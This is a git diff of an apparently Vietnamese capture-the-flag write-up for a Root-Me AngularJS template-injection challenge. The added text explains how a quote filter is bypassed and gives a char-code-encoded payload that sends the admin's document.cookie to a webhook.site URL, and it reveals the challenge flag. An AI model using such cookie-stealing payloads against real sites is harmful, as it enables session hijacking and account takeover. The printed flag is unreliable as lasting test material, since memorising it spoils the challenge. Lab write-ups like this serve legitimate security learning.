@@ -236,6 +236,22 @@ Payload: `{{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb
 Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:
 `http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)&#x27)()}}`
 
-???
+Web không trả về gì cả :<, khả năng đoạn nháy đơn bị filter, vì thế không dùng html encode được. Theo lời mentor và thử dùng payload này:
+
+`{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x())()}}`
+
+> `valueOf.name.constructor.fromCharCode`: `valueOf.name` được sử dụng vì nó trả về một giá trị chuỗi. Thuộc tính `constructor` được sử dụng để lấy hàm khởi tạo của `valueOf.name`:
+ ```js
+valueOf.name === "valueOf" // true
+valueOf.name.constructor === String // true
+```
+> Phương thức `String.fromCharCode()` trả về một chuỗi được tạo từ chuỗi đơn vị mã UTF-16 đã chỉ định.
+
+Payload: `http://challenge01.root-me.org/web-client/ch35/?name={{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102, 61, 96, 104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 97, 97, 53, 101, 102, 98, 50, 100, 45, 48, 54, 49, 50, 45, 52, 98, 55, 55, 45, 57, 54, 99, 99, 45, 55, 57, 54, 48, 54, 102, 54, 98, 99, 56, 97, 97, 63, 36, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 125, 96))()}}`
+
+Chờ cookie của admin gửi về:
+
+![Screenshot 2023-11-13 233731](https://github.com/aQ05/Write-up/assets/121664384/a3e6950a-a2ab-43c1-96fa-f17d3f7a234c)
 ## Flag
-``
+`rootme{@NGu1@R_J$_1$_C001}`
+
